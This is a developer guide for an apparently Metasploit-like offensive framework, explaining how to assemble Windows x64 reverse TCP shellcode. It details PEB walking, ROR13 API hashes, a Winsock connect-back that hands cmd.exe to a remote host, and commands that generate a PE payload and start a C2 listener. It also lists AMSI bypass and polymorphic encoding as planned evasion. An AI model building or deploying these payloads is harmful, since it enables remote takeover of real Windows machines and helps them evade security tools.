# Windows Shellcode Development Guide

## Overview

RCF now supports a complete build system for Windows shellcode. The system assembles real shellcode from assembly source files at compile time, falling back to safe placeholders when the assembler is not available.

## Architecture

```
src/windows_shellcode.asm    →  build.rs (nasm)  →  OUT_DIR/shellcode.rs  →  templates.rs (include!)
```

### Build Process

1. **`build.rs`** checks if `nasm` is installed
2. If found: assembles `windows_shellcode.asm` into raw bytes
3. If not found: generates placeholder bytes (2-byte `xor rax,rax; ret`)
4. Output is written to `$OUT_DIR/shellcode.rs` as a `pub const` array
5. `templates.rs` includes this generated file via `include!()`
6. The template functions reference the generated constant

## How to Build Real Shellcode

### Install NASM

```bash
# macOS
brew install nasm

# Ubuntu/Debian
sudo apt install nasm

# Arch Linux
sudo pacman -S nasm

# Windows (via MSYS2)
pacman -S nasm
```

### Rebuild

```bash
cd /Users/pallabpc/Desktop/r-msf
cargo clean -p rcf-payload
cargo build --release -p rcf-payload
```

You should see:
```
warning: rcf-payload@0.1.0: Assembled Windows x64 reverse TCP shellcode (647 bytes)
```

## Shellcode Design

### Windows x64 Reverse TCP

The assembled shellcode implements:

1. **PEB Walking** — Finds `kernel32.dll` via `gs:[0x60]` → PEB → LDR → InMemoryOrderModuleList
2. **API Resolution** — Parses export tables using ROR13 hash comparison (no string imports → null-free)
3. **Library Loading** — Calls `LoadLibraryA("ws2_32.dll")` to load Winsock
4. **Function Resolution** — Finds `WSAStartup`, `WSASocketW`, `connect`, `CreateProcessA`
5. **Network Setup** — `WSAStartup(2.2)` → `WSASocketW(AF_INET, SOCK_STREAM, 0)` → `connect(LHOST:LPORT)`
6. **Shell Spawning** — `CreateProcessA("cmd.exe")` with `STARTUPINFO` redirecting stdin/stdout/stderr to socket

### Placeholders

| Placeholder | Size | Purpose |
|------------|------|---------|
| `0x7f7f7f7f` | 4 bytes | IP address (pushed as dword, little-endian) |
| `0x7e7e` | 2 bytes | Port (pushed as word, network byte order) |

These are replaced at runtime by `PayloadGenerator::patch_template()`.

### API Hashes

Functions are resolved by computing ROR13 hash of their exported name:

| Function | Hash | DLL |
|----------|------|-----|
| GetProcAddress | `0x7e4207a4` | kernel32.dll |
| LoadLibraryA | `0x65e36706` | kernel32.dll |
| WSAStartup | `0x1fab92eb` | ws2_32.dll |
| WSASocketW | `0x6737dbc2` | ws2_32.dll |
| connect | `0x67d229a5` | ws2_32.dll |
| CreateProcessA | `0x6653251e` | kernel32.dll |

## Testing

### Verify Assembly

```bash
# Assemble manually
nasm -f bin rcf-payload/src/windows_shellcode.asm -o /tmp/shellcode.bin

# Check size
ls -l /tmp/shellcode.bin

# View disassembly
ndisasm -b 64 /tmp/shellcode.bin

# Extract bytes for Rust
xxd -i /tmp/shellcode.bin
```

### Test Payload Generation

```bash
# Generate Windows PE with real shellcode (after installing nasm)
rcf venom -p reverse_tcp --lhost 10.0.0.1 --lport 4444 \
    --platform windows --arch x64 -f pe -o /tmp/payload.exe

# Generate as C array
rcf venom -p reverse_tcp --lhost 10.0.0.1 --lport 4444 \
    --platform windows --arch x64 -f c
```

### On Windows Target

```cmd
# Run payload (from attacker machine)
./target/release/rcf c2 listen
# Deploy agent or PE payload on target
# Interact: > sessions → > interact 1
```

## Adding New Windows Templates

1. Write assembly in `src/windows_<type>_<platform>_<arch>.asm`
2. Use `0x7f7f7f7f` for IP, `0x7e7e` for port
3. Update `build.rs` to assemble the new file
4. Add a `pub const` in the generated output
5. Reference it in `templates.rs`

## Security Notes

- **Null-free**: The shellcode avoids `0x00` bytes (except where unavoidable in strings)
- **Position-independent**: No absolute addresses; all resolved at runtime via PEB walking
- **No imports**: API names are hashed, not stored as strings
- **Small**: ~650 bytes vs msfvenom's ~300-400 bytes (slightly larger due to CreateProcess setup)

## Current Status

| Template | Status | Size |
|----------|--------|------|
| `windows/x64/shell/reverse_tcp` | ⚠️ Assembled from .asm (placeholder if no nasm) | ~650 / 4 bytes |
| `windows/x86/shell/reverse_tcp` | ❌ Stub only | 2 bytes |
| `windows/x64/shell/bind_tcp` | ❌ Stub only | 4 bytes |
| `windows/x86/shell/bind_tcp` | ❌ Stub only | 4 bytes |
| `windows/x64/exec/cmd` | ❌ Stub only | 4 bytes |

## Next Steps

1. **Test on actual Windows** — Deploy assembled shellcode on Windows to verify functionality
2. **x86 templates** — Write 32-bit assembly versions (uses `fs:[0x30]` for PEB, `int 0x80`)
3. **Bind TCP** — Adapt reverse_tcp to use `bind()`/`listen()`/`accept()` instead of `connect()`
4. **AMSI bypass** — Add AMSI bypass stub before shellcode execution
5. **Polymorphic encoding** — Apply polymorphic engine to assembled bytes
